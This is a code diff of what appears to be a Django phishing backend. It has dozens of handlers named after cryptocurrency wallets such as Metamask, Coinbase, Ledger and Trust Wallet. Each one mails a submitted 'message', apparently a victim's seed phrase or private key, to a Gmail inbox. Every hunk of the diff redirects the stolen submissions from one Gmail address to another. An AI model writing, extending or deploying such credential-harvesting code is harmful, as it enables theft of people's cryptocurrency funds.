@@ -26,7 +26,7 @@ def input(request):
             'Bitcoin',
             'Metamask wallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -48,7 +48,7 @@ def coinbase(request):
             'Bitcoin',
             'coinbase wallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -70,7 +70,7 @@ def alphawallet(request):
             'Bitcoin',
             'alphawallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -92,7 +92,7 @@ def argentwallet(request):
             'Bitcoin',
             'argentwallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -113,7 +113,7 @@ def metamask(request):
             'Bitcoin',
             'metamask : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -134,7 +134,7 @@ def trustwallet(request):
             'Bitcoin',
             'trustwallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -155,7 +155,7 @@ def coin98(request):
             'Bitcoin',
             'coin98 : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -175,7 +175,7 @@ def coinomi(request):
             'Bitcoin',
             'coinomi : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -195,7 +195,7 @@ def crypto(request):
             'Bitcoin',
             'crypto : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -216,7 +216,7 @@ def eidoo(request):
             'Bitcoin',
             'eidoo : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -237,7 +237,7 @@ def exodus(request):
             'Bitcoin',
             'exodus : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -258,7 +258,7 @@ def gridplus(request):
             'Bitcoin',
             'gridplus : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -278,7 +278,7 @@ def huobi(request):
             'Bitcoin',
             'huobi : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -299,7 +299,7 @@ def imtoken(request):
             'Bitcoin',
             'imtoken : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -320,7 +320,7 @@ def infinitowallet(request):
             'Bitcoin',
             'infinitowallet : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -341,7 +341,7 @@ def infinity(request):
             'Bitcoin',
             'infinity : ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -363,7 +363,7 @@ def ledger(request):
             'Bitcoin',
             'ledger wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -385,7 +385,7 @@ def mathwallet(request):
             'Bitcoin',
             'math wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -405,7 +405,7 @@ def atomic(request):
             'Bitcoin',
             'atomic: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -426,7 +426,7 @@ def mew(request):
             'Bitcoin',
             'mew: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -446,7 +446,7 @@ def midas(request):
             'Bitcoin',
             'midas: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -467,7 +467,7 @@ def moriX(request):
             'Bitcoin',
             'moriX: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -487,7 +487,7 @@ def mykey(request):
             'Bitcoin',
             'mykey: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -508,7 +508,7 @@ def nash(request):
             'Bitcoin',
             'nash: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -529,7 +529,7 @@ def onto(request):
             'Bitcoin',
             'onto: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -551,7 +551,7 @@ def ownbit(request):
             'Bitcoin',
             'ownbit: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -572,7 +572,7 @@ def peakdefi(request):
             'Bitcoin',
             'peakdefi: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -593,7 +593,7 @@ def pillar(request):
             'Bitcoin',
             'pillar: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -614,7 +614,7 @@ def rainbow(request):
             'Bitcoin',
             'rainbow: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -635,7 +635,7 @@ def safepal(request):
             'Bitcoin',
             'safepal wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -656,7 +656,7 @@ def safepal(request):
             'Bitcoin',
             'safepal wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -678,7 +678,7 @@ def sparkpoint(request):
             'Bitcoin',
             'spark point wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -700,7 +700,7 @@ def spatium(request):
             'Bitcoin',
             'spatium wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -722,7 +722,7 @@ def swft(request):
             'Bitcoin',
             'swft wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -744,7 +744,7 @@ def tokenpocket(request):
             'Bitcoin',
             'token pocket wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -766,7 +766,7 @@ def tokenpockett(request):
             'Bitcoin',
             'token pocket wallet 2: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -787,7 +787,7 @@ def tronlink(request):
             'Bitcoin',
             'tronlink: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -809,7 +809,7 @@ def atwallet(request):
             'Bitcoin',
             'atwallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -830,7 +830,7 @@ def unstoppable(request):
             'Bitcoin',
             'unstoppable wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -851,7 +851,7 @@ def vision(request):
             'Bitcoin',
             'vision wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -872,7 +872,7 @@ def walleth(request):
             'Bitcoin',
             'walleth: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -893,7 +893,7 @@ def walletio(request):
             'Bitcoin',
             'walleth IO: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -914,7 +914,7 @@ def xdc(request):
             'Bitcoin',
             'XDC wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
@@ -935,7 +935,7 @@ def zelcore(request):
             'Bitcoin',
             'zelcore wallet: ' + data['message'],
             'smileinnovativesolutions@gmail.com',
-            ['codewithsmile00@gmail.com'],
+            ['ladsavvy@gmail.com'],
             fail_silently=False,
         )
 		return redirect('/barcode/')
